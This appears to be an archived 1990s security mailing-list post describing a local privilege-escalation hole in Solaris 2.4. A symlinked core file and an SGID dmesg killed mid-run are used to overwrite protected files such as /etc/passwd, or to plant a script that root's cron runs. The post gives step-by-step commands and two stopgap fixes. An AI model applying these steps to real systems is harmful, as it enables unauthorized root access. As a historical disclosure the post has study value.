@@ -1,0 +1,106 @@
+From: Jungseok Roh <beren@cosmos.kaist.ac.kr>
+
+
+ I think this bug is widely spreaded in Korea . but not all over the world.
+ The following contents are wholly from SeokChan Lee,  one of the best alu
+ mnus of the legendaray security task force team .K** .
+ Also whom I look up to ..:)
+
+ The problem is the Core dump system of Zolaris 2.4 .
+ let's look into the man page of core(4) . and then concentrate on one phr-
+ ase .
+
+core(4)                   File Formats                    core(4)
+NAME
+     core - core image file
+DESCRIPTION
+     The operating system writes out a core image  of  a  process
+     when  it  is  terminated due to the receipt of some signals.
+     The core  image  is  called  core  and  is  written  in  the
+     process's  working  directory  (provided  it  can be; normal
+     access controls apply).  A process with an effective user ID
+     different  from  the  real  user  ID will not produce a core
+     image.
+
+  NOTICE the last phrase !!
+
+  A PROCESS with an effective user ID different from the real user ID will
+  NOT produce a core image . That's very important in Security phase .
+  If such systmem be not SET , We can make a core file anywhere ....
+  Just killing the signal .. ( U knows why i use the term KILL )..
+
+  * Now just Sightsee  the file system..
+    another INTERESTING stuff in file system detected.
+
+[cosmos:beren] uname -a
+SunOS cosmos 5.4 Generic_101945-32 sun4m sparc
+[cosmos:beren] ls -ald /etc
+ $)C
+   8 drwxrwxr-x  25 root     sys         3584  7 ?y  25 @O   18:46 /etc/
+[cosmos:beren] ls -ald /usr
+   2 drwxrwxr-x  30 root     sys         1024  7 ?y   5 @O   17:26 /usr/
+[cosmos:beren] ls -ald /usr/sbin
+  10 drwxrwxr-x   4 root     bin         4608  5 ?y  18 @O   03:38 /usr/sbin/
+[cosmos:beren] ls -ald /usr/sbin
+  10 drwxrwxr-x   4 root     bin         4608  5 ?y  18 @O   03:38 /usr/sbin/
+
+  ****  It's GROUP WRITABLE !!  *****
+
+  Most of u guys know what I about to say ..
+  Main Idea is ..
+  "Let's stab that file system at back using the sword , SGIDed utils.. "
+  then let's traverse the file system and then take the sword ..
+
+[cosmos:beren] find /usr -perm -2000 \( -group sys -o -group bin \) -ls
+  ...
+
+  its sword family is dmesg , netstat and all that .
+  then take "dmesg" as the sword .
+
+[cosmos:beren] ls -al /usr/sbin/dmesg
+  12 -r-xr-sr-x   1 bin      sys         5520 1994  Jul 15 /usr/sbin/dmesg*
+
+  It's sys SGIDed.
+
+[cosmos:beren] ln -s /etc/SOMETHING core
+[cosmos:beren] stty ^\^\
+[cosmos:beren] pwd
+/tmp
+[cosmos:beren] dmesg
+/* then slightly after u type this command kill it . using stty ^\^\
+   there comes the following results */
+^C (Core dumped)
+[comos:beren] ls /etc/SOMETHING
+SOMETHING
+
+like this way u can overwrite /etc/passwd or do any operation on them.
+if u runs sparc Zolaris 2.4 look at the root's crontab file .
+see it ..! definately it contains the next phrase ..
+
+# The rtc command is run to adjust the real time clock if and when
+1 2 * * * [ -x /usr/sbin/rtc ] && /usr/sbin/rtc -c > /dev/null 2>&1
+
+rtc is used in zolaris x86.
+
+so u can make /usr/sbin/rtc as the exploitation script . and can do anythin.
+
+U Can fix this problem.. "Two ways.."
+but These two TEMPORARY FIXING has drawbacks on its phase.
+
+1. Just blow up the Group - writable bit on each file system..
+  ** but there occurs  a problem when PATCH is needed..
+   I don't know what problem would be occur ..
+   but the GURU seokchan Lee notified me that .
+
+2. echo "set coredefault=0" >> /etc/system
+  ** but it makes CoreDump disable..
+   might be Not a good method if you develop somethin. and wanna view core.
+
+ I don't know sun made a patch on this effect.
+ It doesn't work on Zolaris 2.5 .. I tested it.
+
+__
+
+  Beren .. it the lost tales ....
+
+ JungSeok Roh /  Junior in KAIST management Dep. / beren@cosmos.kaist.ac.kr
